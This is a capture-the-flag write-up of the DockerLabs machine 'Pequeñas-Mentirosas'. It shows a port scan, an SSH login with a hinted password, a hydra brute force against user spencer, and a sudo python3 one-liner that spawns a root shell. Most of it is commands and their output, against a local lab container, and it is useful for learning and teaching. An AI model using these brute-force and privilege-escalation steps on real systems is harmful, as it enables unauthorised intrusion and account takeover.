# Pequeñas-Mentirosas

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Pequeñas-Mentirosas | beafn28 | easy | dockerlabs |

**Summary:** The compromise began with service discovery that exposed SSH and Apache on a minimal Debian target, followed by web content review that revealed a clue pointing to credentials for user `a`. That hint enabled authenticated shell access through SSH, which immediately shifted the operation from external probing into local privilege mapping. Internal user enumeration exposed a second account named `spencer`, and targeted SSH password auditing recovered valid credentials as `spencer:password1`. After lateral movement with `su`, sudo policy inspection revealed a critical misconfiguration allowing passwordless execution of `/usr/bin/python3` as any user. Executing Python with command execution primitives provided direct root shell access, completing the chain from recon to full host takeover through weak credential strategy and unsafe sudo delegation.


## Recon

1. I deployed the lab machine and confirmed the assigned container IP address.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/dockerlabs/pequenas-mentirosas]
└─$ sudo bash auto_deploy.sh pequenas-mentirosas.tar
[sudo] password for ouba:

                            ##        .
                      ## ## ##       ==
                   ## ## ## ##      ===
               /""""""""""""""""\___/ ===
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/
                 \    \        __/
                  \____\______/

  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]



Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

2. I prepared target variables for repeatable command execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/Pequeñas-Mentirosas]
└─$ ip=172.17.0.2 && url=http://$ip
```

3. I ran a full TCP scan with default scripts and version detection. The host exposed only SSH and HTTP.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/Pequeñas-Mentirosas]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 17:51 WIB
Nmap scan report for 3f5b3a0e5d46 (172.17.0.2)
Host is up (0.000010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.73 seconds
```

4. I retrieved the web root response headers and body, then identified a direct clue about obtaining the key for user `A` in files.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/Pequeñas-Mentirosas]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Tue, 24 Mar 2026 10:55:56 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Fri, 27 Sep 2024 07:22:46 GMT
ETag: "55-62314b8bd5d80"
Accept-Ranges: bytes
Content-Length: 85
Vary: Accept-Encoding
Content-Type: text/html

<html><body><h1>Pista: Encuentra la clave para A en los archivos.</h1></body></html>
```

## Initial Access

1. Based on the web clue and account naming context, I attempted SSH authentication as user `a` and obtained a valid shell with password `secret`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/Pequeñas-Mentirosas]
└─$ ssh a@$ip
a@172.17.0.2's password:
Linux 7c57b25399de 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
a@7c57b25399de:~$ id;whoami;hostname
uid=1001(a) gid=1001(a) groups=1001(a)
a
7c57b25399de
a@7c57b25399de:~$ which sudo
/usr/bin/sudo
```

2. I enumerated local shell users and identified `spencer` as another potential pivot account.

```bash
a@7c57b25399de:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
spencer:x:1000:1000::/home/spencer:/bin/bash
a:x:1001:1001::/home/a:/bin/bash
```

3. I performed targeted SSH password testing against `spencer` and recovered valid credentials.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/Pequeñas-Mentirosas]
└─$ hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 8
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-24 18:07:42
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: spencer   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-24 18:07:55
```

## PrivEsc

1. I switched into `spencer` and enumerated sudo rights. The account could run Python as any user without password enforcement.

```bash
a@7c57b25399de:~$ su - spencer
Password:
spencer@7c57b25399de:~$ sudo -l
Matching Defaults entries for spencer on 7c57b25399de:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User spencer may run the following commands on 7c57b25399de:
    (ALL) NOPASSWD: /usr/bin/python3
```

2. I executed Python through sudo to spawn a root interactive shell and validated complete administrative control.

```bash
spencer@7c57b25399de:~$ sudo /usr/bin/python3 -c 'import os; os.system("sudo -i")'
root@7c57b25399de:~# id;whoami;hostname;pwd;ls -la
uid=0(root) gid=0(root) groups=0(root)
root
7c57b25399de
/root
total 24
drwx------ 1 root root 4096 Mar 24 11:09 .
drwxr-xr-x 1 root root 4096 Mar 24 10:51 ..
-rw------- 1 root root    5 Mar 24 11:09 .bash_history
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Sep 27  2024 .ssh
```


## Attack Chain Summary
1. **Reconnaissance**: Full service enumeration identified SSH and Apache, while HTTP response inspection exposed an application clue tied to user `A`.
2. **Vulnerability Discovery**: The web clue revealed weak credential handling and guided account oriented access attempts rather than complex exploit development.
3. **Exploitation**: SSH access as `a` was established, then password auditing recovered `spencer:password1` for controlled lateral movement.
4. **Internal Enumeration**: Local account and privilege checks confirmed sudo availability and exposed explicit policy misconfiguration on executable scope.
5. **Privilege Escalation**: `spencer` had `NOPASSWD` rights on `/usr/bin/python3`, enabling direct root shell execution through Python command invocation.

